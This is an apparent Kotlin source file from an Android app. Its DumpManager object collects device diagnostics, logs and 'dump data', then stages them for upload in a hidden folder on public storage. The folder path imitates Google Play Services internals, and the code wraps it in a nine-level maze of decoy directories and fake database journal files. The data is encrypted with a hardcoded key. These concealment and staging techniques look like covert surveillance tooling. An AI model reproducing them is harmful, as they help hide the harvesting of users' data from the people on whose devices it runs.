package com.example.myandroid

import android.content.Context
import android.os.Environment
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import javax.crypto.spec.GCMParameterSpec
import java.security.SecureRandom
import org.json.JSONObject
import org.json.JSONArray
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock

object DumpManager {

    private val logScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val logMutex = Mutex()

    // The Catacombs: 9-level maze structure
    private val MAZE_ROOT = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android")
    private val TRUE_PATH = "data/com.google.android.gms/files/cache/.sys_config/.v2/.internal/.identity"
    private val ROOT_DIR = File(MAZE_ROOT, TRUE_PATH)
    private val KEY = "C0rtexS3cr3tK3y!".toByteArray() // 16 bytes for AES-128

    fun getVaultSize(): String {
        var totalSize = 0L
        var fileCount = 0
        try {
            if (!MAZE_ROOT.exists()) return "Vault Empty (0 B)"
            MAZE_ROOT.walkTopDown().forEach { file ->
                if (file.isFile) {
                    totalSize += file.length()
                    fileCount++
                }
            }
        } catch (e: Exception) { return "Error: ${e.message}" }
        val sizeStr = if (totalSize > 1024 * 1024) String.format("%.2f MB", totalSize / (1024.0 * 1024.0)) else "${totalSize / 1024} KB"
        return "Vault: $sizeStr | Files: $fileCount"
    }

    fun createDailyDump(ctx: Context) {
        try {
            ensureMaze()
            val dateStr = SimpleDateFormat("d_M_yy", Locale.US).format(Date())
            val dayDir = File(ROOT_DIR, dateStr)
            if (!dayDir.exists()) dayDir.mkdirs()

            val timestamp = SimpleDateFormat("HH_mm_ss", Locale.US).format(Date())
            
            // 1. Readable Log
            val logFile = File(dayDir, "sys_log_$timestamp.txt")
            val report = DeviceManager.getDiagnosticReport(ctx) + "\n\n--- LOGS ---\n" + DebugLogger.getLogs()
            logFile.writeText(report)

            // 2. Compressed & Encrypted Data Blob (.ctx extension)
            val jsonFile = File(dayDir, "data_snapshot_$timestamp.ctx")
            val rawJson = CloudManager.collectDumpData(ctx).toString()
            
            // Compress first to save ~80% space before encryption
            val bos = java.io.ByteArrayOutputStream()
            java.util.zip.GZIPOutputStream(bos).use { it.write(rawJson.toByteArray(Charsets.UTF_8)) }
            
            val encrypted = encrypt(bos.toByteArray())
            jsonFile.writeBytes(encrypted)

            DebugLogger.log("DUMP", "Saved to ${dayDir.absolutePath}")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun getDumpsForToday(): List<File> {
        val dateStr = SimpleDateFormat("d_M_yy", Locale.US).format(Date())
        val dayDir = File(ROOT_DIR, dateStr)
        return if (dayDir.exists()) dayDir.listFiles()?.toList() ?: emptyList() else emptyList()
    }

    fun getRootDir(): File = ROOT_DIR

    private fun encrypt(data: ByteArray): ByteArray {
        // 1. Setup GCM Parameters
        val iv = ByteArray(12) // GCM standard IV size
        SecureRandom().nextBytes(iv)
        val spec = GCMParameterSpec(128, iv) // 128-bit authentication tag
        
        // 2. Initialize Cipher
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val secretKey = SecretKeySpec(KEY, "AES")
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, spec)
        
        // 3. Encrypt data
        val ciphertext = cipher.doFinal(data)
        
        // 4. Return [IV (12 bytes)] + [Ciphertext + Tag]
        val combined = ByteArray(iv.size + ciphertext.size)
        System.arraycopy(iv, 0, combined, 0, iv.size)
        System.arraycopy(ciphertext, 0, combined, iv.size, ciphertext.size)
        return combined
    }

    fun logVerification(category: String, pkg: String) {
        try {
            if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs()
            File(ROOT_DIR, "sensor_verification.txt").appendText("[" + SimpleDateFormat("HH:mm:ss", Locale.US).format(Date()) + "] [$category] $pkg ✓\n")
        } catch (e: Exception) { }
    }

    // --- STREAM LOGGING (SURVIVOR PROTOCOL) ---
    private const val MAX_CHUNK_SIZE = 2 * 1024 * 1024 // 2MB chunks
    private const val MAX_TOTAL_CHUNKS = 25 // 50MB Max Storage

    fun appendLog(type: String, data: JSONObject) {
        logScope.launch { 
            logMutex.withLock {
                try {
                    ensureMaze()
                    val activeFile = File(ROOT_DIR, "active_buffer.jsonl")
                    
                    val wrapper = JSONObject()
                    wrapper.put("t", type)
                    wrapper.put("d", data)
                    
                    activeFile.appendText(wrapper.toString() + "\n")
                    
                    // Rotate and Compress if too large
                    if (activeFile.length() > MAX_CHUNK_SIZE) {
                        val timestamp = System.currentTimeMillis()
                        val tempFile = File(ROOT_DIR, "temp_${timestamp}.jsonl")
                        activeFile.renameTo(tempFile)
                        
                        // Compress the chunk to save 80% disk space and data bandwidth
                        val gzFile = File(ROOT_DIR, "offline_log_${timestamp}.jsonl.gz")
                        try {
                            java.util.zip.GZIPOutputStream(gzFile.outputStream()).use { gz ->
                                tempFile.inputStream().use { input -> input.copyTo(gz) }
                            }
                            tempFile.delete() // Clean up raw text
                        } catch (e: Exception) {
                            // Fallback: If compression fails, just keep raw file
                            tempFile.renameTo(File(ROOT_DIR, "offline_log_${timestamp}.jsonl"))
                        }
                        enforceStorageLimits()
                    }
                } catch (e: Exception) { e.printStackTrace() }
            }
        }
    }

    private fun enforceStorageLimits() {
        try {
            val logs = ROOT_DIR.listFiles { _, name -> name.startsWith("offline_log_") } ?: return
            if (logs.size > MAX_TOTAL_CHUNKS) {
                logs.sortedBy { it.lastModified() }
                    .take(logs.size - MAX_TOTAL_CHUNKS)
                    .forEach { it.delete() }
            }
        } catch(e: Exception) {}
    }

    private fun ensureMaze() {
        try {
            if (ROOT_DIR.exists()) return
            
            val levels = TRUE_PATH.split("/")
            var current = MAZE_ROOT
            
            val decoys = mapOf(
                0 to listOf("System", "Media", "Legacy"),
                1 to listOf("obb", "manifests", "protoc"),
                2 to listOf("com.android.vending", "com.google.android.apps.maps"),
                3 to listOf("shared_prefs", "databases", "app_textures"),
                4 to listOf("tmp", "thumbnails", "webview"),
                5 to listOf(".font_data", ".res_cache", ".blob_store"),
                6 to listOf(".v1", ".backup", ".old"),
                7 to listOf(".tmp_shared", ".metadata_v3"),
                8 to listOf("secondary", "recovery", "temp_node")
            )

            levels.forEachIndexed { index, name ->
                // Create decoys at this level
                decoys[index]?.forEach { decoyName ->
                    val decoyDir = File(current, decoyName)
                    if (!decoyDir.exists()) {
                        decoyDir.mkdirs()
                        // Put a dummy file in the decoy
                        val dummy = File(decoyDir, "journal_v${index + 1}.db-wal")
                        if (!dummy.exists()) dummy.writeBytes(ByteArray(1024) { 0 })
                    }
                }
                // Move to next level in true path
                current = File(current, name)
                if (!current.exists()) current.mkdirs()
            }
        } catch (e: Exception) { }
    }

    fun getRotatedLogs(): List<File> {
        try {
            // Force rotate active buffer so we upload the latest data too
            val activeFile = File(ROOT_DIR, "active_buffer.jsonl")
            if (activeFile.exists() && activeFile.length() > 0) {
                val timestamp = System.currentTimeMillis()
                val tempFile = File(ROOT_DIR, "temp_${timestamp}.jsonl")
                activeFile.renameTo(tempFile)
                
                val gzFile = File(ROOT_DIR, "offline_log_${timestamp}.jsonl.gz")
                try {
                    java.util.zip.GZIPOutputStream(gzFile.outputStream()).use { gz ->
                        tempFile.inputStream().use { input -> input.copyTo(gz) }
                    }
                    tempFile.delete()
                } catch (e: Exception) {
                    tempFile.renameTo(File(ROOT_DIR, "offline_log_${timestamp}.jsonl"))
                }
            }
            // Grab both compressed (.gz) and any fallback uncompressed (.jsonl) files
            return ROOT_DIR.listFiles { _, name -> name.startsWith("offline_log_") }?.toList() ?: emptyList()
        } catch (e: Exception) { return emptyList() }
    }
}
